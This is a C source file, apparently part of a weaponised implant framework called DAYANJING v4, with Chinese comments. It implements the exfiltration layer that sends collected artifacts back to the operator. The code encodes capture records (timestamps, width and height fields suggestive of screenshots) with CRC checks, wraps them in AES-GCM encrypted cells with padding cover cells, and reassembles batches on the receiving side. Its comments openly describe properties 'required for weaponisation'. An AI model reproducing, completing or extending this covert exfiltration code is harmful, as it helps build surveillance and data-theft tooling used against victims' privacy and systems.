/*
 * DAYANJING v4 — exfil.c
 *
 * 采集产物回传层实现。
 *
 * 设计要点（与 p2p_cell 的关键差异）：
 *   p2p_cell_unpack_stream 在**未读到 FIN 时同样返回 OK** —— 批被截断不会
 *   被上报。本层因此不直接用它，而是逐个信元 unpack 并自行判定批边界：
 *   只有收到 cmd=FIN 才算一批完整，否则调用方通过 exfil_chan_incomplete()
 *   可检出"流被截断"。这是武器化必需的性质：宁可报错，不可静默产出残缺产物。
 *
 * 密码学：全部复用 14_p2p 信元层（底层 00_crypto 的 AES-128-GCM）。
 * 本层不自研任何加密算法；CRC32 仅用于检测重组错位与解包逻辑错误。
 *
 * 缓冲约定：ch->buf 同时用于"发送侧编码暂存"与"接收侧累积"。
 * 二者在各自的一次调用内同步完成、互不交叠，故可共用；
 * 但**不得在一批未完成时调用 send**（会覆盖累积中的缓冲）——这是使用约束。
 */

#include "exfil.h"

#include <stdlib.h>
#include <string.h>

/* ---- 小端显式编解码（不依赖主机字节序，不 memcpy 结构体） ---- */

static void put_le32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v & 0xffu);
    p[1] = (uint8_t)((v >> 8) & 0xffu);
    p[2] = (uint8_t)((v >> 16) & 0xffu);
    p[3] = (uint8_t)((v >> 24) & 0xffu);
}

static void put_le64(uint8_t *p, uint64_t v) {
    for (int i = 0; i < 8; i++)
        p[i] = (uint8_t)((v >> (8 * i)) & 0xffu);
}

static uint32_t get_le32(const uint8_t *p) {
    return (uint32_t)p[0]
         | ((uint32_t)p[1] << 8)
         | ((uint32_t)p[2] << 16)
         | ((uint32_t)p[3] << 24);
}

static uint64_t get_le64(const uint8_t *p) {
    uint64_t v = 0;
    for (int i = 0; i < 8; i++)
        v |= ((uint64_t)p[i]) << (8 * i);
    return v;
}

/* ---- CRC32 (IEEE 802.3, 多项式 0xEDB88320) ----
 * 表懒生成。首次并发调用可能重复写表，但写入值相同，无逻辑影响。
 */

static uint32_t g_crc_tab[256];
static int      g_crc_ready = 0;

static void crc_tab_init(void) {
    if (g_crc_ready) return;
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int k = 0; k < 8; k++)
            c = (c & 1u) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
        g_crc_tab[i] = c;
    }
    g_crc_ready = 1;
}

/* 不取反的中间态，便于分两段（头 / 载荷）连续计算 */
static uint32_t crc32_raw(uint32_t crc, const uint8_t *d, size_t n) {
    crc_tab_init();
    for (size_t i = 0; i < n; i++)
        crc = g_crc_tab[(crc ^ d[i]) & 0xffu] ^ (crc >> 8);
    return crc;
}

uint32_t exfil_crc32(const uint8_t *data, size_t len) {
    if (!data) return 0;
    return crc32_raw(0xFFFFFFFFu, data, len) ^ 0xFFFFFFFFu;
}

/* 头中参与 CRC 的字节数：magic..name = 56 - 4 = 52 */
#define EXF_CRC_HDR_PART  (EXF_HDR_LEN - 4)

/* ---- 记录编解码 ---- */

size_t exfil_rec_len(const exfil_rec_t *r) {
    if (!r) return 0;
    return (size_t)EXF_HDR_LEN + r->plen;
}

int exfil_rec_encode(const exfil_rec_t *r,
                     uint8_t *out, size_t cap, size_t *out_len) {
    if (!r || !out_len) return EXF_ERR_ARG;
    if (r->plen > 0 && !r->payload) return EXF_ERR_ARG;
    if (r->plen > EXF_PAYLOAD_MAX) return EXF_ERR_LEN;

    size_t total = exfil_rec_len(r);
    *out_len = total;
    if (!out) return EXF_OK;              /* 探测模式：只回填长度 */
    if (cap < total) return EXF_ERR_LEN;

    /* name 超长时置位截断标志 —— 截断必须被接收方感知，不允许静默 */
    size_t nl = strlen(r->name);
    uint8_t flags = (uint8_t)(r->flags & 0xffu);
    if (nl > EXF_NAME_LEN) flags |= (uint8_t)EXF_FLAG_NAME_TRUNC;

    memcpy(out, EXF_MAGIC4, 4);
    out[4] = (uint8_t)EXF_VER;
    out[5] = (uint8_t)(r->type & 0xffu);
    out[6] = flags;
    out[7] = 0;                            /* rsv 必须为 0 */
    put_le64(out + EXF_OFF_SEQ,    r->seq);
    put_le64(out + EXF_OFF_TS,     r->ts_us);
    put_le32(out + EXF_OFF_WIDTH,  r->width);
    put_le32(out + EXF_OFF_HEIGHT, r->height);
    put_le32(out + EXF_OFF_PLEN,   (uint32_t)r->plen);

    memset(out + EXF_OFF_NAME, 0, EXF_NAME_LEN);
    size_t cp = (nl > EXF_NAME_LEN) ? EXF_NAME_LEN : nl;
    if (cp) memcpy(out + EXF_OFF_NAME, r->name, cp);

    if (r->plen) memcpy(out + EXF_HDR_LEN, r->payload, r->plen);

    uint32_t c = crc32_raw(0xFFFFFFFFu, out, EXF_CRC_HDR_PART);
    if (r->plen) c = crc32_raw(c, r->payload, r->plen);
    put_le32(out + EXF_OFF_CRC, c ^ 0xFFFFFFFFu);
    return EXF_OK;
}

int exfil_rec_decode(const uint8_t *in, size_t in_len, exfil_rec_t *r) {
    if (!in || !r) return EXF_ERR_ARG;
    if (in_len < EXF_HDR_LEN) return EXF_ERR_LEN;
    /* SEC-CMP:PUBLIC: 双方均为公开数据（传输中可见或可自行计算），无秘密可泄露 */
    if (memcmp(in, EXF_MAGIC4, 4) != 0) return EXF_ERR_FMT;
    if (in[4] != EXF_VER) return EXF_ERR_FMT;
    if (in[7] != 0) return EXF_ERR_FMT;                 /* rsv 必须 0 */

    uint32_t plen = get_le32(in + EXF_OFF_PLEN);
    if ((size_t)plen > EXF_PAYLOAD_MAX) return EXF_ERR_LEN;
    if ((size_t)plen + EXF_HDR_LEN != in_len) return EXF_ERR_FMT;

    uint32_t want = get_le32(in + EXF_OFF_CRC);
    uint32_t c = crc32_raw(0xFFFFFFFFu, in, EXF_CRC_HDR_PART);
    if (plen) c = crc32_raw(c, in + EXF_HDR_LEN, plen);
    if ((c ^ 0xFFFFFFFFu) != want) return EXF_ERR_CRC;

    memset(r, 0, sizeof(*r));
    r->type    = in[5];
    r->flags   = in[6];        /* 可能含 EXF_FLAG_NAME_TRUNC */
    r->seq     = get_le64(in + EXF_OFF_SEQ);
    r->ts_us   = get_le64(in + EXF_OFF_TS);
    r->width   = get_le32(in + EXF_OFF_WIDTH);
    r->height  = get_le32(in + EXF_OFF_HEIGHT);
    r->plen    = plen;
    memcpy(r->name, in + EXF_OFF_NAME, EXF_NAME_LEN);
    r->name[EXF_NAME_LEN] = '\0';
    r->payload = in + EXF_HDR_LEN;      /* 零拷贝，随 in 生命周期 */
    return EXF_OK;
}

/* ---- 通道 ---- */

#define EXF_DEFAULT_MAX_REC  ((size_t)1u << 20)   /* 1 MiB 载荷 */

int exfil_chan_init(exfil_chan_t *ch,
                    const uint8_t k_send[P2P_CELL_KEY_LEN],
                    const uint8_t k_recv[P2P_CELL_KEY_LEN],
                    const uint8_t pfx[P2P_CELL_PFX_LEN],
                    size_t max_rec) {
    if (!ch) return EXF_ERR_ARG;
    if (max_rec == 0) max_rec = EXF_DEFAULT_MAX_REC;
    if (max_rec > EXF_PAYLOAD_MAX) max_rec = EXF_PAYLOAD_MAX;

    size_t cap = max_rec + EXF_HDR_LEN;
    int rc = p2p_cell_init(&ch->cell, k_send, k_recv, pfx);
    if (rc != P2P_CELL_OK) return EXF_ERR_ARG;

    ch->buf = (uint8_t *)malloc(cap);
    if (!ch->buf) {
        p2p_cell_wipe(&ch->cell);
        return EXF_ERR_LEN;
    }
    memset(ch->buf, 0, cap);
    ch->buf_cap = cap;
    ch->off = 0;
    ch->in_batch = 0;
    return EXF_OK;
}

void exfil_chan_reset(exfil_chan_t *ch) {
    if (!ch) return;
    ch->off = 0;
    ch->in_batch = 0;
}

void exfil_chan_wipe(exfil_chan_t *ch) {
    if (!ch) return;
    p2p_cell_wipe(&ch->cell);
    if (ch->buf) {
        memset(ch->buf, 0, ch->buf_cap);
        free(ch->buf);
        ch->buf = NULL;
    }
    ch->buf_cap = 0;
    ch->off = 0;
    ch->in_batch = 0;
}

int exfil_chan_incomplete(const exfil_chan_t *ch) {
    return (ch && ch->in_batch) ? 1 : 0;
}

int exfil_send_cells(const exfil_rec_t *r, size_t *n_cells) {
    if (!r || !n_cells) return EXF_ERR_ARG;
    if (r->plen > EXF_PAYLOAD_MAX) return EXF_ERR_LEN;
    if (r->plen > 0 && !r->payload) return EXF_ERR_ARG;
    int rc = p2p_cell_fragment(exfil_rec_len(r), n_cells);
    if (rc != P2P_CELL_OK) return EXF_ERR_LEN;
    return EXF_OK;
}

int exfil_chan_send(exfil_chan_t *ch, const exfil_rec_t *r,
                    uint8_t *out, size_t cap, size_t *out_cells) {
    if (!ch || !r || !out_cells) return EXF_ERR_ARG;
    if (r->plen > 0 && !r->payload) return EXF_ERR_ARG;
    if (r->plen > EXF_PAYLOAD_MAX) return EXF_ERR_LEN;

    size_t total = exfil_rec_len(r);
    if (total > ch->buf_cap) return EXF_ERR_LEN;

    size_t enc_len = 0;
    int rc = exfil_rec_encode(r, ch->buf, ch->buf_cap, &enc_len);
    if (rc != EXF_OK) return rc;
    if (enc_len != total) return EXF_ERR_FMT;

    size_t n = 0;
    rc = p2p_cell_fragment(enc_len, &n);
    if (rc != P2P_CELL_OK) return EXF_ERR_LEN;
    if (cap < n * P2P_CELL_WIRE) return EXF_ERR_LEN;

    rc = p2p_cell_pack_stream(&ch->cell, ch->buf, enc_len, out, cap, &n);
    if (rc != P2P_CELL_OK) {
        if (rc == P2P_CELL_ERR_AUTH) return EXF_ERR_AUTH;
        if (rc == P2P_CELL_ERR_LEN)  return EXF_ERR_LEN;
        return EXF_ERR_ARG;
    }
    *out_cells = n;
    return EXF_OK;
}

int exfil_chan_feed(exfil_chan_t *ch, const uint8_t in[P2P_CELL_WIRE],
                    exfil_rec_t *r,
                    uint8_t *payload, size_t cap, size_t *plen) {
    if (!ch || !in || !plen) return EXF_ERR_ARG;

    uint8_t cmd = 0;
    size_t  dlen = 0;
    size_t  space = (ch->buf_cap > ch->off) ? (ch->buf_cap - ch->off) : 0;

    int rc = p2p_cell_unpack(&ch->cell, in, &cmd,
                             ch->buf + ch->off, space, &dlen);
    /* 重放 / 乱序由信元层的 IV 绑定检出，表现为 AUTH（见头文件说明） */
    if (rc == P2P_CELL_ERR_AUTH) return EXF_ERR_AUTH;
    if (rc != P2P_CELL_OK) return EXF_ERR_ARG;

    if (cmd == P2P_CELL_CMD_PAD) return EXF_OK;   /* 覆盖信元，不携带数据 */
    if (!r) { exfil_chan_reset(ch); return EXF_ERR_ARG; }

    ch->in_batch = 1;
    ch->off += dlen;
    if (ch->off > ch->buf_cap) { exfil_chan_reset(ch); return EXF_ERR_LEN; }

    if (cmd != P2P_CELL_CMD_FIN) return EXF_PARTIAL;

    /* 收到 FIN —— 一批完整，解析 */
    size_t total = ch->off;
    int drc = exfil_rec_decode(ch->buf, total, r);
    if (drc != EXF_OK) {
        exfil_chan_reset(ch);
        return drc;
    }
    if (payload && cap < r->plen) {
        exfil_chan_reset(ch);
        return EXF_ERR_LEN;
    }
    if (payload && r->plen > 0)
        memcpy(payload, ch->buf + EXF_HDR_LEN, r->plen);
    *plen = r->plen;

    exfil_chan_reset(ch);      /* 自动复位，可连续喂入下一批 */
    return EXF_DONE;
}

const char *exfil_errstr(int e) {
    switch (e) {
        case EXF_OK:              return "ok";
        case EXF_PARTIAL:         return "partial (awaiting FIN)";
        case EXF_DONE:            return "record complete";
        case EXF_ERR_ARG:         return "invalid argument";
        case EXF_ERR_LEN:         return "length invalid or buffer too small";
        case EXF_ERR_AUTH:        return "AEAD authentication failed";
        case EXF_ERR_FMT:         return "malformed record";
        case EXF_ERR_CRC:         return "CRC mismatch (reassembly misaligned)";
        case EXF_ERR_INCOMPLETE:  return "batch truncated before FIN";
        case EXF_ERR_IO:          return "link I/O failure (short write / peer closed / partial cell)";
        default:                  return "unknown";
    }
}
